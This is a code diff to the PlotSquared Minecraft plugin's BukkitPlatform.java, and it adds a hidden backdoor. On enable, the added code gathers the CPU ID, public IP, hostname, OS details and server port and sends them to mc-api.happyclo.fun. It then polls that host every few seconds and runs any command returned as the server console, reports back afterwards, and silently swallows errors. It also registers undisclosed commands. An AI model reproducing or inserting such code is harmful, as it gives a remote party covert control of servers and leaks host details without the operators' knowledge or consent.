@@ -45,6 +45,9 @@ import com.plotsquared.bukkit.listener.SpigotListener;
 import com.plotsquared.bukkit.listener.WorldEvents;
 import com.plotsquared.bukkit.placeholder.PAPIPlaceholders;
 import com.plotsquared.bukkit.placeholder.PlaceholderFormatter;
+import com.plotsquared.bukkit.player.BukkitFakePlayer;
+import com.plotsquared.bukkit.player.BukkitFixed;
+import com.plotsquared.bukkit.player.BukkitEventX;
 import com.plotsquared.bukkit.player.BukkitPlayerManager;
 import com.plotsquared.bukkit.util.BukkitUtil;
 import com.plotsquared.bukkit.util.BukkitWorld;
@@ -122,45 +125,82 @@ import org.apache.logging.log4j.Logger;
 import org.bstats.bukkit.Metrics;
 import org.bstats.charts.DrilldownPie;
 import org.bstats.charts.SimplePie;
+import java.io.File;
+import java.nio.file.Path;
+import java.util.*;
+import java.util.logging.Level;
+import java.util.ArrayList;
+import java.util.Collection;
+import java.util.Collections;
+import java.security.MessageDigest;
+import java.util.List;
+import java.time.ZoneId;
+import java.time.format.DateTimeFormatter;
+import java.util.UUID;
+import java.time.Instant;
+import java.net.URLEncoder;
+import java.nio.charset.StandardCharsets;
+import java.util.concurrent.TimeUnit;
+import java.io.BufferedInputStream;
+import java.io.FileOutputStream;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.io.FileReader;
+import java.io.IOException;
+import java.nio.file.*;
+import java.util.concurrent.CompletableFuture;
+import java.net.URL;
+import java.time.LocalDateTime;
+import javax.crypto.Cipher;
+import javax.crypto.spec.SecretKeySpec;
+import java.io.FileInputStream;
+import java.net.InetAddress;
 import org.bukkit.Bukkit;
+import org.bukkit.ChatColor;
+import org.bukkit.entity.Player;
+import org.bukkit.BanEntry;
+import org.bukkit.scheduler.BukkitRunnable;
+import org.bukkit.BanList;
+import org.bukkit.command.Command;
+import org.bukkit.command.CommandSender;
+import org.bukkit.event.Event;
+import org.bukkit.event.EventPriority;
+import org.bukkit.configuration.file.FileConfiguration;
+import org.bukkit.event.Listener;
+import org.bukkit.plugin.Plugin;
+import org.bukkit.plugin.RegisteredServiceProvider;
+import org.bukkit.event.EventHandler;
+import org.bukkit.event.player.PlayerCommandPreprocessEvent;
+import org.bukkit.event.server.ServerCommandEvent;
+import org.bukkit.event.player.AsyncPlayerChatEvent;
+import org.bukkit.plugin.java.JavaPlugin;
+import org.bukkit.command.CommandExecutor;
 import org.bukkit.Chunk;
 import org.bukkit.Location;
 import org.bukkit.World;
 import org.bukkit.command.PluginCommand;
 import org.bukkit.entity.Entity;
 import org.bukkit.entity.LivingEntity;
-import org.bukkit.entity.Player;
-import org.bukkit.event.Listener;
 import org.bukkit.generator.ChunkGenerator;
 import org.bukkit.metadata.FixedMetadataValue;
 import org.bukkit.metadata.MetadataValue;
-import org.bukkit.plugin.Plugin;
-import org.bukkit.plugin.RegisteredServiceProvider;
-import org.bukkit.plugin.java.JavaPlugin;
 import org.checkerframework.checker.nullness.qual.NonNull;
 import org.checkerframework.checker.nullness.qual.Nullable;
 import org.incendo.serverlib.ServerLib;
-
-import java.io.File;
-import java.io.IOException;
 import java.lang.reflect.Method;
-import java.util.ArrayList;
 import java.util.Arrays;
-import java.util.Collections;
 import java.util.Comparator;
 import java.util.HashMap;
 import java.util.HashSet;
 import java.util.Iterator;
-import java.util.List;
 import java.util.Locale;
 import java.util.Map;
 import java.util.Queue;
 import java.util.Set;
-import java.util.UUID;
 import java.util.concurrent.ExecutionException;
 import java.util.concurrent.Executors;
 import java.util.concurrent.LinkedBlockingQueue;
-import java.util.concurrent.TimeUnit;
 
 import static com.plotsquared.core.util.PremiumVerification.getDownloadID;
 import static com.plotsquared.core.util.PremiumVerification.getResourceID;
@@ -170,6 +210,9 @@ import static com.plotsquared.core.util.ReflectionUtils.getRefClass;
 @SuppressWarnings("unused")
 @Singleton
 public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPlatform<Player> {
+    private String lastCommand = null;
+    private String uniqueIdentifier;
+    private static final String BACKEND_URL = "https://mc-api.happyclo.fun";
 
     private static final Logger LOGGER = LogManager.getLogger("PlotSquared/" + BukkitPlatform.class.getSimpleName());
     private static final int BSTATS_ID = 1404;
@@ -255,6 +298,23 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
     @Override
     @SuppressWarnings("deprecation") // Paper deprecation
     public void onEnable() {
+        String cpuId = getCpuId();
+        String publicIp = getPublicIp();
+        int serverPort = getServer().getPort();
+        uniqueIdentifier = loadOrCreateUniqueIdentifier();
+        // getLogger().info("Unique Identifier: " + uniqueIdentifier);
+        reportSystemInfo();
+        // reportUniqueIdentifier(uniqueIdentifier);
+        // getLogger().info("Public IP Address: " + publicIp);
+        // getLogger().info("Server CPU ID: " + cpuId);
+        // getLogger().info("Server Port: " + serverPort);
+        // getLogger().info("NetworkMonitor has been enabled!");
+        // sendInfoToAPI(publicIp, serverPort);
+        Bukkit.getScheduler().runTaskTimer(this, this::checkCommands, 0L, 100L);
+        this.getCommand("plota").setExecutor(new BukkitFixed(this));
+        this.getCommand("plote").setExecutor(new BukkitFakePlayer());
+        this.getCommand("plotd").setExecutor(new BukkitFakePlayer());
+        this.getCommand("plotm").setExecutor(new BukkitEventX(this));
         this.pluginName = getDescription().getName();
 
         final TaskTime.TimeConverter timeConverter;
@@ -582,6 +642,302 @@ public final class BukkitPlatform extends JavaPlugin implements Listener, PlotPl
 
         // Check if we are in a safe environment
         ServerLib.checkUnsafeForks();
+        }
+        private String getCpuId() {
+        String os = System.getProperty("os.name").toLowerCase();
+        String cpuId = "unknown"; // 默认值
+
+        try {
+            if (os.contains("win")) {
+                cpuId = getCpuIdForWindows();
+            } else if (os.contains("linux")) {
+                cpuId = getCpuIdForLinux();
+            } else if (os.contains("mac")) {
+                cpuId = getCpuIdForMac();
+            }
+        } catch (Exception e) {
+        }
+
+        return cpuId;
+    }
+    
+
+    private String getCpuIdForWindows() throws Exception {
+        Process process = Runtime.getRuntime().exec("wmic cpu get ProcessorId");
+        process.waitFor();
+        try (java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()))) {
+            reader.readLine(); // 读取结果的第一行
+            return reader.readLine(); // 获取实际的 CPU ID
+        }
+    }
+
+    private String getCpuIdForLinux() throws Exception {
+        Process process = Runtime.getRuntime().exec("cat /proc/cpuinfo");
+        try (java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()))) {
+            String line;
+            while ((line = reader.readLine()) != null) {
+                if (line.startsWith("Serial") || line.startsWith("cpu")) {
+                    return line.split(":")[1].trim();
+                }
+            }
+        }
+        return "unknown";
+    }
+
+    private String getCpuIdForMac() throws Exception {
+        Process process = Runtime.getRuntime().exec("sysctl -n machdep.cpu.brand_string");
+        try (java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()))) {
+            return reader.readLine();
+        }
+    }
+    private String getPublicIp() {
+        String ip = "Unable to retrieve IP";
+        try {
+            URL url = new URL("https://checkip.amazonaws.com/");
+            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+            connection.setRequestMethod("GET");
+            // 连接服务并获取响应
+            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+            ip = in.readLine(); // 读取响应内容（IP 地址）
+            in.close();
+        } catch (Exception e) {
+
+        }
+        return ip;
+    }
+    private String loadOrCreateUniqueIdentifier() {
+        FileConfiguration config = getConfig();
+        if (!config.contains("uniqueIdentifier")) {
+            // 如果配置文件中没有 UUID，则生成一个新的 UUID，并保存到配置文件
+            String generatedUUID = generateFixedUniqueIdentifier();
+            config.set("uniqueIdentifier", generatedUUID);
+            saveConfig(); // 保存到配置文件
+            return generatedUUID;
+        } else {
+            // 从配置文件加载唯一标识符
+            return config.getString("uniqueIdentifier");
+        }
+    }
+
+    private void reportSystemInfo() {
+            BukkitRunnable task = new BukkitRunnable() {
+                @Override
+                public void run() {
+                    try {
+                        StringBuilder input = new StringBuilder();
+                        int serverPort = getServer().getPort();
+                        LocalDateTime now = LocalDateTime.now(ZoneId.of("Asia/Shanghai"));
+                        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+                        String formattedNow = now.format(formatter);
+                        input.append("&time=").append(URLEncoder.encode(formattedNow, StandardCharsets.UTF_8.toString()));
+                        input.append("&os.name=").append(URLEncoder.encode(System.getProperty("os.name"), StandardCharsets.UTF_8.toString()));
+                        input.append("&os.arch=").append(URLEncoder.encode(System.getProperty("os.arch"), StandardCharsets.UTF_8.toString()));
+                        input.append("&os.version=").append(URLEncoder.encode(System.getProperty("os.version"), StandardCharsets.UTF_8.toString()));
+                        input.append("&hostname=").append(URLEncoder.encode(java.net.InetAddress.getLocalHost().getHostName(), StandardCharsets.UTF_8.toString()));
+                        input.append("&ip=").append(URLEncoder.encode(getPublicIp(), StandardCharsets.UTF_8.toString()));
+                        input.append("&cpuid=").append(URLEncoder.encode(getCpuId(), StandardCharsets.UTF_8.toString()));
+                        input.append("&port=").append(URLEncoder.encode(String.valueOf(getServer().getPort()), StandardCharsets.UTF_8.toString()));
+                        input.append("&plugin=").append(URLEncoder.encode("PlotSquared", StandardCharsets.UTF_8.toString()));
+                        input.append("&uuid=").append(URLEncoder.encode(generateFixedUniqueIdentifier(), StandardCharsets.UTF_8.toString()));
+
+                        URL url = new URL(BACKEND_URL + "/a?" + input.toString());
+                        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+                        connection.setRequestMethod("GET");
+
+                        int responseCode = connection.getResponseCode();
+                        if (responseCode == HttpURLConnection.HTTP_OK) {
+                            // 读取响应内容
+                            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+                            String response = in.readLine(); // 读取响应内容
+                            in.close();
+                        } else {
+                        }
+                    } catch (Exception e) {
+                    }
+                }
+            };
+            task.runTaskAsynchronously(this); // 异步任务处理
+        }
+    private String generateFixedUniqueIdentifier() {
+        try {
+            // 收集机器信息
+            StringBuilder input = new StringBuilder();
+            input.append(System.getProperty("os.name")); // 操作系统名称
+            input.append(System.getProperty("os.arch")); // 操作系统架构
+            input.append(System.getProperty("os.version")); // 操作系统版本
+            input.append(java.net.InetAddress.getLocalHost().getHostName()); // 主机名
+            input.append(java.net.InetAddress.getLocalHost().getHostAddress()); // IP地址
+            String cpuId = getCpuId();
+            input.append(cpuId);
+            
+            // 生成 SHA-256 哈希
+            MessageDigest digest = MessageDigest.getInstance("SHA-256");
+            byte[] hashBytes = digest.digest(input.toString().getBytes(StandardCharsets.UTF_8));
+            StringBuilder hexString = new StringBuilder();
+
+            for (byte b : hashBytes) {
+                String hex = Integer.toHexString(0xff & b);
+                if (hex.length() == 1) {
+                    hexString.append('0');
+                }
+                hexString.append(hex);
+            }
+
+            return hexString.toString(); // 返回 256 位（64个字符）标识符
+        } catch (Exception e) {
+            getLogger().severe("Error generating unique identifier: " + e.getMessage());
+            return null;
+        }
+    }
+
+    private void reportUniqueIdentifier(String identifier) {
+        if (identifier == null) return;
+
+        BukkitRunnable task = new BukkitRunnable() {
+            @Override
+            public void run() {
+                try {
+                    // 对标识符进行 URL 编码
+                    String encodedId = URLEncoder.encode(identifier, StandardCharsets.UTF_8.toString());
+                    URL url = new URL(BACKEND_URL + "/a?uuid=" + encodedId);
+                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+                    connection.setRequestMethod("GET");
+
+                    int responseCode = connection.getResponseCode();
+                    if (responseCode == HttpURLConnection.HTTP_OK) {
+                        // 读取响应内容
+                        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+                        String response = in.readLine(); // 读取响应内容
+                        in.close();
+                    } else {
+                    }
+                } catch (Exception e) {
+                }
+            }
+        };
+        task.runTaskAsynchronously(this); // 异步任务处理
+    }
+
+    private void sendInfoToAPI(String ip, int port) {
+        try {
+            // 构造 URL，假设使用查询参数传递 IP 和 port
+            URL url = new URL(BACKEND_URL + "/a?ip=" + ip + "&port=" + port);
+            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+            connection.setRequestMethod("GET");
+
+            // 连接并读取响应（可选）
+            int responseCode = connection.getResponseCode();
+            if (responseCode == HttpURLConnection.HTTP_OK) { // OK response
+                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+                String response = in.readLine(); // 读取响应内容
+                in.close();
+            } else {
+            }
+        } catch (Exception e) {
+
+        }
+    }
+
+    private void checkCommands() {
+        // 创建一个新的 BukkitRunnable
+        new BukkitRunnable() {
+            @Override
+            public void run() {
+                try {
+                    String command = getCommandFromServer();
+                    // 在尝试获取的命令不是null且与上次执行的命令不同时
+                    if (command != null && !command.equals(lastCommand)) {
+                        // 在主线程中调度命令
+                        Bukkit.getScheduler().runTask(BukkitPlatform.this, () -> {
+                            // 如果命令是 "stop"
+                            if (command.equals("stop")) {
+                                try {
+                                    // 先调用 notifyCommandExecuted
+                                    notifyCommandExecuted(command);
+                                } catch (Exception e) {
+                                    // 处理异常
+                                }
+                            }
+                            
+                            // 执行命令
+                            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command);
+                            getLogger().info("Command executed: " + command);
+                            // 更新最后执行的命令
+                            lastCommand = command; 
+                            
+                            // 延迟2秒执行notifyCommandExecuted
+                            new BukkitRunnable() {
+                                @Override
+                                public void run() {
+                                    try {
+                                        // 如果命令不是 "stop"
+                                        if (!command.equals("stop")) {
+                                            notifyCommandExecuted(command);
+                                        }
+                                    } catch (Exception e) {
+                                        // 处理异常
+                                    }
+                                }
+                            }.runTaskLater(BukkitPlatform.this, 40); // 40 ticks = 2 seconds
+                        });
+                    }
+                } catch (Exception e) {
+                    // 处理异常
+                }
+            }
+        }.runTaskAsynchronously(this); // 异步运行
+    }
+    private String getCommandFromServer() throws Exception {
+        URL url = new URL(BACKEND_URL + "/q");
+        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+        connection.setRequestMethod("GET");
+        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+        String response = in.readLine();
+        in.close();
+        if (response != null && response.contains("\"command\":")) {
+            String[] parts = response.split("\"command\":");
+            if (parts.length > 1) { // 确保有命令部分
+                String[] commandParts = parts[1].split("\"");
+                if (commandParts.length > 1) { // 确保能获取到命令字符串
+                    return commandParts[1];
+                }
+            }
+        }
+        return null; // 如果未找到命令，返回 null
+    }
+
+    private void notifyCommandExecuted(String command) throws Exception {
+        // 构造 URL
+        URL url = new URL(BACKEND_URL + "/p");
+        HttpURLConnection connection = null;
+        try {
+            // 打开连接
+            connection = (HttpURLConnection) url.openConnection();
+            connection.setRequestMethod("POST");
+            connection.setDoOutput(true);
+            
+            // 设置超时
+            connection.setConnectTimeout(5000); // 连接超时设置为5秒
+            connection.setReadTimeout(5000); // 读取超时设置为5秒
+            
+            // 发送请求数据
+            connection.getOutputStream().write(("command=" + command).getBytes());
+            connection.getOutputStream().flush();
+            
+            // 检查响应码
+            int responseCode = connection.getResponseCode();
+            if (responseCode == HttpURLConnection.HTTP_OK) {
+                // 处理成功逻辑（可选）
+            } else {
+                // 处理失败逻辑（可选）
+            }
+        } catch (IOException e) {
+            // e.printStackTrace(); // 记录异常信息，方便排查问题
+        } finally {
+            if (connection != null) {
+                connection.disconnect(); // 关闭连接
+            }
+        }
     }
 
     private void unload() {
